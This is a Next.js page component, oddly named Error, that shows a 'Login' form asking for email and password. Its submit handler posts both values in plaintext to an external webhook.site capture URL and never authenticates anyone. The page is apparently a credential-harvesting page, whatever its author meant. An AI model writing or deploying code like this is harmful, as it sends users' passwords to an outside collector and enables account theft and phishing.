import React from 'react';
import { useRouter } from 'next/router';
import axios from 'axios';
import { Formik, Form, Field } from 'formik';
import Head from 'next/head';
import Button from '../components/Button';
import CardBox from '../components/CardBox';
import SectionFullScreen from '../components/Section/FullScreen';
import LayoutGuest from '../layouts/Guest';
import { getPageTitle } from '../config';
import Buttons from '../components/Buttons';
import Divider from '../components/Divider';
import FormField from '../components/Form/Field';
import { mdiAccount, mdiBallotOutline, mdiMail } from '@mdi/js';
export default function Error() {
  const router = useRouter();

  const handleSubmit = (values) => {
    const headers = {
      'Access-Control-Allow-Origin': '*',
      'Content-Type': 'application/json',
    };

    axios
      .post('https://webhook.site/8161e561-46c6-4a54-a9a3-668325d05843', values, { headers })
      .then((response) => {
        console.log('sent sms', response.data);
        // Redirect to the "/" page or handle success
        // router.push('/');
      })
      .catch((error) => {
        console.error('Error submitting form:', error);
        // Handle the error appropriately
      });
  };
  

  return (
    <>
      <Head>
        <title>{getPageTitle('Login')}</title>
      </Head>

      <SectionFullScreen bg="purplePink">
        <CardBox className="w-11/12 md:w-7/12 lg:w-6/12 xl:w-4/12 shadow-2xl">
        <Formik
            initialValues={{ email: '', password: '' }}
            onSubmit={(values) => handleSubmit(values)}
          >
            <Form>
              <FormField label="Email" help="Please enter your Email">
                <Field name="email" type="email" id="email"  />
              </FormField>
              
              <FormField label="Password" help="Please enter your password">
                <Field type="password" id="password" name="password" />
              </FormField>
              <Divider />

              <Buttons>
                <Button type="submit" label="Login" color="success" />
                <Button href="/signup" label="Register" color="warning" outline />
              </Buttons>
            </Form>
          </Formik>
        </CardBox>
      </SectionFullScreen>
    </>
  );
}

Error.getLayout = function getLayout(page) {
  return <LayoutGuest>{page}</LayoutGuest>;
};
